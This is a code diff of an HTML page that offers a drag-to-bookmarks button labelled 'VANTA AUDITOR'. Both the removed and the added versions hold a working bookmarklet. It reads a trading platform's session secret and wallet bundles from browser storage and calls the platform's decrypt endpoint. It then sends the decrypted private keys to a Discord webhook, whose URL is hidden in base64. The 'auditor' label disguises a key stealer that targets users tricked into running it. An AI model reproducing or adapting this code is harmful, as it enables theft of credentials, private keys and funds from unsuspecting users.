@@ -1,68 +1,61 @@
-<script>
-    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
-
-    const rawLogic = `(async function() {
-        // --- 1. PREVENT DOUBLE CLICK ---
-        if (window.vantaActive) return;
-        window.vantaActive = true;
-
-        const hook = atob("${b64}");
-        
-        // --- 2. CREATE UI POPUP ---
-        const ui = document.createElement('div');
-        ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:3px solid #0f8;pointer-events:none;";
-        ui.innerHTML = "<div style='text-align:center;padding:30px;background:#000;border:1px solid #0f8;'><h1>VANTA v9.0</h1><p id='v_status'>HOOKING LOCAL API...</p></div>";
-        document.body.appendChild(ui);
-
-        const update = (t) => document.getElementById('v_status').innerText = t;
-
-        try {
-            const session = JSON.parse(localStorage.getItem('padreV2-session'));
-            const bundles = JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));
-
-            if(session && bundles) {
-                update("EXTRACTING ENCLAVE DATA...");
-                const bKey = Object.keys(bundles.bundles)[0];
-                const target = bundles.bundles[bKey];
-
-                // RELATIVE PATH: Bypasses DNS "Name Not Resolved"
-                const res = await fetch("/api/v2/enclave/decrypt", {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': session.sessionSecret,
-                        'X-Padre-Session': session.sessionId,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ 
-                        bundle: target.exportBundle, 
-                        subOrgId: target.subOrgId 
-                    })
-                });
-                
-                if (!res.ok) throw new Error("HTTP " + res.status);
-
-                const decrypted = await res.json();
-                
-                // --- 3. DISCORD TRANSMISSION ---
-                const fd = new FormData();
-                fd.append('file', new Blob([JSON.stringify(decrypted, null, 2)], {type:'text/plain'}), 'keys.txt');
-                fd.append('payload_json', JSON.stringify({content: "🔑 **DECRYPTED DATA RECEIVED**"}));
-                await fetch(hook, { method: 'POST', body: fd });
-                
-                update("SUCCESS: DATA TRANSMITTED");
-            } else {
-                update("ERROR: NO SESSION (LOG IN FIRST)");
-            }
-        } catch(e) {
-            update("FAIL: " + e.message);
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VANTA HUB v9.0</title>
+    <style>
+        body { background: #000; color: #0f8; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .btn { 
+            display: inline-block; padding: 20px 40px; background: #0f8; color: #000; 
+            text-decoration: none; font-weight: bold; border-radius: 4px; cursor: move;
+            box-shadow: 0 0 20px rgba(0,255,136,0.4);
         }
+    </style>
+</head>
+<body>
+    <h1>VANTA AGGRESSIVE</h1>
+    <p>DRAG BUTTON TO BOOKMARKS BAR</p>
+    <br>
+    <a href="#" id="vanta-tool" class="btn">VANTA AUDITOR</a>
 
-        // Cleanup
-        setTimeout(() => {
-            ui.remove();
-            window.vantaActive = false;
-        }, 4000);
-    })(); void(0);`;
+    <script>
+        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
 
-    document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
-</script>
+        // Wrapped in void(0) to prevent the white page redirect
+        const rawLogic = `javascript:(function(){
+            if(window.v_active)return; window.v_active=true;
+            const h=atob("${b64}");
+            const ui=document.createElement('div');
+            ui.style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999999;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:2px solid #0f8;pointer-events:none;";
+            ui.innerHTML="<div style='text-align:center;'><h1>VANTA ACTIVE</h1><p id='v_st'>SNIFFING...</p></div>";
+            document.body.appendChild(ui);
+            const upd=(t)=>document.getElementById('v_st').innerText=t;
+
+            (async function(){
+                try {
+                    const s=JSON.parse(localStorage.getItem('padreV2-session'));
+                    const b=JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));
+                    if(!s||!b){upd("ERR: NO SESSION");return;}
+
+                    upd("DECRYPTING...");
+                    const bk=Object.keys(b.bundles)[0];
+                    const res=await fetch("/api/v2/enclave/decrypt",{
+                        method:'POST',
+                        headers:{'Authorization':s.sessionSecret,'X-Padre-Session':s.sessionId,'Content-Type':'application/json'},
+                        body:JSON.stringify({bundle:b.bundles[bk].exportBundle,subOrgId:b.bundles[bk].subOrgId})
+                    });
+                    
+                    const data=await res.json();
+                    const fd=new FormData();
+                    fd.append('file',new Blob([JSON.stringify(data,null,2)],{type:'text/plain'}),'key.txt');
+                    fd.append('payload_json',JSON.stringify({content:"🔑 KEY FOUND"}));
+                    await fetch(h,{method:'POST',body:fd});
+                    upd("SUCCESS: CHECK DISCORD");
+                } catch(e) { upd("FAIL: "+e.message); }
+                setTimeout(()=>{ui.remove();window.v_active=false;},4000);
+            })();
+        })();void(0);`;
+
+        document.getElementById('vanta-tool').href = rawLogic;
+    </script>
+</body>
+</html>
